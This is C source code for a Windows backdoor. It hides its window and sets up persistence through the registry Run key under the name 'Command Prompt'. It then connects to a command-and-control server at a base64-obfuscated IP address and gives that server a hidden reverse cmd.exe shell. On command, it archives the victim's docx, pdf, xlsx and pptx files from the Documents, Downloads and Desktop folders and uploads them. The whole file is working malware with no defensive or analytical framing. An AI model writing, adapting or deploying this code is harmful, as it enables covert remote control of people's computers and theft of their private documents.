#include "stdafx.h"

#pragma comment(lib, "wsock32.lib") // for winsock
#pragma warning(disable:4996)

#define PORT_NUMBER 16120 
#define SOCKET_TIMEOUT 5 
#define SIZE 100 
char MY_MUTEX_NAME[11] = "MUTEX_NAME";

char* base64Decoder(char encoded[], int len_str)
{
	char* decoded_string;

	decoded_string = (char*)malloc(sizeof(char) * SIZE);

	int i, j, k = 0;

	// stores the bitstream. 
	int num = 0;

	// count_bits stores current 
	// number of bits in num. 
	int count_bits = 0;

	// selects 4 characters from 
	// encoded string at a time. 
	// find the position of each encoded 
	// character in char_set and stores in num. 
	for (i = 0; i < len_str; i += 4) {
		num = 0, count_bits = 0;
		for (j = 0; j < 4; j++) {
			// make space for 6 bits. 
			if (encoded[i + j] != '=') {
				num = num << 6;
				count_bits += 6;
			}

			/* Finding the position of each encoded
			character in char_set
			and storing in "num", use OR
			'|' operator to store bits.*/

			// encoded[i + j] = 'E', 'E' - 'A' = 5 
			// 'E' has 5th position in char_set. 
			if (encoded[i + j] >= 'A' && encoded[i + j] <= 'Z')
				num = num | (encoded[i + j] - 'A');

			// encoded[i + j] = 'e', 'e' - 'a' = 5, 
			// 5 + 26 = 31, 'e' has 31st position in char_set. 
			else if (encoded[i + j] >= 'a' && encoded[i + j] <= 'z')
				num = num | (encoded[i + j] - 'a' + 26);

			// encoded[i + j] = '8', '8' - '0' = 8 
			// 8 + 52 = 60, '8' has 60th position in char_set. 
			else if (encoded[i + j] >= '0' && encoded[i + j] <= '9')
				num = num | (encoded[i + j] - '0' + 52);

			// '+' occurs in 62nd position in char_set. 
			else if (encoded[i + j] == '+')
				num = num | 62;

			// '/' occurs in 63rd position in char_set. 
			else if (encoded[i + j] == '/')
				num = num | 63;

			// ( str[i + j] == '=' ) remove 2 bits 
			// to delete appended bits during encoding. 
			else {
				num = num >> 2;
				count_bits -= 2;
			}
		}

		while (count_bits != 0) {
			count_bits -= 8;

			// 255 in binary is 11111111 
			decoded_string[k++] = (num >> count_bits) & 255;
		}
	}

	// place NULL character to mark end of string. 
	decoded_string[k] = '\0';

	return decoded_string;
}

DWORD WINAPI SendFileToServer()
{
	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION pi;

	// fill info
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// hide process
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	// get document folder and string cat us
	char userPath[1500] = "";
	char rarPath[53] = "\"c:\\program files\\winrar\\rar.exe\" a UpdateFiles.zip ";
	strcat(userPath, rarPath);

	//================================== all file in documents folder =====================
	char docPath[200] = " \"";
	StrCatA(docPath, getenv("USERPROFILE"));
	StrCatA(docPath, "\\documents\\*.docx\"");
	// add userpath
	StrCatA(userPath, docPath);

	char docPath2[200] = " \"";
	StrCatA(docPath2, getenv("USERPROFILE"));
	StrCatA(docPath2, "\\documents\\*.pdf\"");
	// add userpath
	StrCatA(userPath, docPath2);

	char docPath3[200] = " \"";
	StrCatA(docPath3, getenv("USERPROFILE"));
	StrCatA(docPath3, "\\documents\\*.xlsx\"");
	// add userpath
	StrCatA(userPath, docPath3);

	char docPath4[200] = " \"";
	StrCatA(docPath4, getenv("USERPROFILE"));
	StrCatA(docPath4, "\\documents\\*.pptx\"");
	// add userpath
	StrCatA(userPath, docPath4);
	
	//===================================== all file in download folder=====================
	char downloadPath[200] = " \"";
	StrCatA(downloadPath, getenv("USERPROFILE"));
	StrCatA(downloadPath, "\\downloads\\*.docx\"");
	// add userpath 
	StrCatA(userPath, downloadPath);

	char downloadPath2[200] = " \"";
	StrCatA(downloadPath2, getenv("USERPROFILE"));
	StrCatA(downloadPath2, "\\downloads\\*.pdf\"");
	StrCatA(userPath, downloadPath2);

	char downloadPath3[200] = " \"";
	StrCatA(downloadPath3, getenv("USERPROFILE"));
	StrCatA(downloadPath3, "\\downloads\\*.xlsx\"");
	StrCatA(userPath, downloadPath3);

	char downloadPath4[200] = " \"";
	StrCatA(downloadPath4, getenv("USERPROFILE"));
	StrCatA(downloadPath4, "\\downloads\\*.pptx\"");
	StrCatA(userPath, downloadPath4);

	//=========================================destop folder=====================
	char desktopPath[200] = " \"";
	StrCatA(desktopPath, getenv("USERPROFILE"));
	StrCatA(desktopPath, "\\desktop\\*.docx\"");
	StrCatA(userPath, desktopPath);

	char desktopPath2[200] = " \"";
	StrCatA(desktopPath2, getenv("USERPROFILE"));
	StrCatA(desktopPath2, "\\desktop\\*.pdf\"");
	StrCatA(userPath, desktopPath2);

	char desktopPath3[200] = " \"";
	StrCatA(desktopPath3, getenv("USERPROFILE"));
	StrCatA(desktopPath3, "\\desktop\\*.xlsx\"");
	StrCatA(userPath, desktopPath3);

	char desktopPath4[200] = " \"";
	StrCatA(desktopPath4, getenv("USERPROFILE"));
	StrCatA(desktopPath4, "\\desktop\\*.pptx\"");
	StrCatA(userPath, desktopPath4);

	//=================================== create command ==============================

	// zip file
	CreateProcessA(NULL, userPath, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);

	// close thread and process just create
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	Sleep(2000);
	//============================================send file=======================================================
	SOCKET sendFileSock;
	SOCKADDR_IN sendFileSaddr;
	WSADATA wsadata;

	WSAStartup(MAKEWORD(1, 1), &wsadata); // use winsock v1 

	// setup socket 
	char enc_ip[21] = "MTkyLjE2OC4xOC4yMTg=";
	//char enc_ip[21] = "MjA3LjQ2LjIyNi4xNTg=";
	char* ip_address = base64Decoder(enc_ip, 21);
	sendFileSock = socket(AF_INET, SOCK_STREAM, 0);
	sendFileSaddr.sin_family = AF_INET;
	sendFileSaddr.sin_port = htons(16121);
	sendFileSaddr.sin_addr.s_addr = inet_addr(ip_address);

	char fileZip[100] = "";
	StrCatA(fileZip, getenv("TEMP"));
	StrCatA(fileZip, "\\UpdateFiles.zip");

	connect(sendFileSock, (struct sockaddr*) & sendFileSaddr, sizeof(sendFileSaddr));
	FILE* fp = fopen(fileZip, "rb");
	if (fp == NULL) {
		return 0;
	}

	char sendbuf[100];
	int b = 0;

	while ((b = fread(sendbuf, 1, sizeof(sendbuf), fp)) > 0)
	{
		send(sendFileSock, sendbuf, b, 0);
	}

	fclose(fp);
	closesocket(sendFileSock);
	return 1;
}

int _tmain(int argc, _TCHAR* argv[])
{
	//hide windows
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	HANDLE hMutex = CreateMutexA(NULL, FALSE, MY_MUTEX_NAME);

	if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
		return 0;
	}
	

	// ===================================persistence===================================================
	// startup 
	HKEY hkey;
	char pszPath[MAX_PATH] = "";
	char pszPath2[MAX_PATH] = "";

	//SHGetSpecialFolderPathA(0, pszPath, 50, 0);
	GetTempPathA(MAX_PATH, pszPath);
	StrCatA(pszPath2, pszPath);
	StrCatA(pszPath2, "\\cmd.exe");

	int len = strlen(pszPath2);

	if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL) == ERROR_SUCCESS) {

		// RegOpenKeyA(hkey, NULL, &hkey);
		RegSetKeyValueA(hkey, NULL, "Command Prompt", REG_SZ, pszPath2, len);
		RegCloseKey(hkey);
	}
	// =====================================find .docx, excel, powerpoint in Folder=====================================
	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION pi;

	// fill info
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// hide process
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	// get document folder and string cat us
	char userPath[1500] = "";
	char rarPath[53] = "\"c:\\program files\\winrar\\rar.exe\" a UpdateFiles.zip ";
	strcat(userPath, rarPath);

	// ======================================connect C&C server===============================================
	SOCKET localSock;
	SOCKADDR_IN localSaddr;
	WSADATA wsadata;

	WSAStartup(MAKEWORD(1, 1), &wsadata); // use winsock v1 

	// setup socket 
	int port = PORT_NUMBER;
	char enc_ip[21] = "MTkyLjE2OC4xOC4yMTg=";
	//char enc_ip[21] = "MjA3LjQ2LjIyNi4xNTg=";
	char* ip_address = base64Decoder(enc_ip, 21);
	localSock = socket(AF_INET, SOCK_STREAM, 0);
	localSaddr.sin_family = AF_INET;
	//localSaddr.sin_port = htons(16121);
	localSaddr.sin_addr.s_addr = inet_addr(ip_address);

	localSock = socket(AF_INET, SOCK_STREAM, 0);
	localSaddr.sin_port = htons(port);
	char recvBuf[1024];
	char sendBuf[1024];
	HANDLE newstdin, newstdout, readout, writein = NULL; // the handle for our pipe
	DWORD bytesRead, avail, bytesWritten;

	// set up structs for CreateProcess
	STARTUPINFO sinfo; // startupinfo structure for CreateProcess
	PROCESS_INFORMATION pinfo; // process info struct needed for CreateProcess
	ZeroMemory(&sinfo, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	ZeroMemory(&pinfo, sizeof(pinfo));
	SECURITY_ATTRIBUTES secat; // security attributes structure needed for CreateProcess
	secat.nLength = sizeof(SECURITY_ATTRIBUTES);
	secat.lpSecurityDescriptor = NULL;
	secat.bInheritHandle = TRUE;

	GetStartupInfo(&sinfo); // fill startup struct 
	sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE; // hide command prompt on launch 

	SOCKET err_code;

	char exit1[] = { 'e', 'x', 'i', 't', 10, 0 }; // need this to compare out com mand to 'exit'
	char exit2[] = { 'E', 'X', 'I', 'T', 10, 0 };

	char recvFileZip[] = { 'g', 'e', 't', 'f', 'i', 'l', 'e', 10, 0 }; // recv file UpdateFiles.zip


	while (1) {
		err_code = SOCKET_ERROR;
		while (err_code == SOCKET_ERROR) {
			localSock = socket(AF_INET, SOCK_STREAM, 0);
			// connect socket with ip = 192.168.18.218 and port = 16120
			err_code = connect(localSock, (struct sockaddr*) & localSaddr, sizeof(localSaddr));
		}

		// create the pipes for out command promt
		CreatePipe(&newstdin, &writein, &secat, 0);
		CreatePipe(&readout, &newstdout, &secat, 0);
		sinfo.hStdOutput = newstdout; // redirect stdout 
		sinfo.hStdError = newstdout; // redirect stderr
		sinfo.hStdInput = newstdin; // redirect stdin 

		// start cmd prompt 
		LPTSTR szCmdLine = _tcsdup(TEXT("C:\\Windows\\System32\\cmd.exe"));
		char exitCmdProcess[5] = "exit";

		if (CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &sinfo, &pinfo) == FALSE) {
			goto closeup;
		}
		while (1)
		{			
			if (send(localSock, sendBuf, strlen(sendBuf), 0) == SOCKET_ERROR) {
				WriteFile(writein, exit1, strlen(exit1), &bytesWritten, NULL);
				goto closeup;
			}
			bytesRead = 0;

			// check if the pipe already contains something we can write to output
			PeekNamedPipe(readout, sendBuf, sizeof(sendBuf), &bytesRead, &avail, NULL);

			if (bytesRead != 0)
			{
				while (bytesRead != 0)
				{
					//read data from cmd.exe and send to server, then clear the buffer 
					ReadFile(readout, sendBuf, sizeof(sendBuf), &bytesRead, NULL);
					if (send(localSock, sendBuf, strlen(sendBuf), 0) == SOCKET_ERROR) {
						//cout << "Socket close\n";
						goto closeup;
					}
					ZeroMemory(sendBuf, sizeof(sendBuf));
					Sleep(100);
					PeekNamedPipe(readout, sendBuf, sizeof(sendBuf), &bytesRead, &avail, NULL);
				}
			}
			ZeroMemory(recvBuf, sizeof(recvBuf));

			// receive the command given 
			if (recv(localSock, recvBuf, sizeof(recvBuf), 0) == SOCKET_ERROR) {
				goto closeup;
			}

			// if command is 'recv' then send file zip to server
			if ((strcmp(recvBuf, recvFileZip) == 0))
			{
				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendFileToServer, 0, 0, NULL);
				goto next;
			}

			// if command is 'exit' then we have to capture it to prevent our program from hanging 
			if ((strcmp(recvBuf, exit1) == 0) || (strcmp(recvBuf, exit2) == 0))
			{
				// let cmd.exe close by giving the command, then go to closeup label 
				WriteFile(writein, recvBuf, strlen(recvBuf), &bytesWritten, NULL);
				goto closeup;
			}

			// else write the command to cmd.exe 
			WriteFile(writein, recvBuf, strlen(recvBuf), &bytesWritten, NULL);

			// clear recvBuf
			next:
			ZeroMemory(recvBuf, sizeof(recvBuf));
		}

		// close up all handles and the socket 
	closeup:
		CloseHandle(writein);
		CloseHandle(readout);
		CloseHandle(newstdout);
		CloseHandle(newstdin);

		CloseHandle(pinfo.hThread);
		CloseHandle(pinfo.hProcess);
		closesocket(localSock);

		Sleep(3000);
	}
	CloseHandle(hMutex);
	return 0;
}

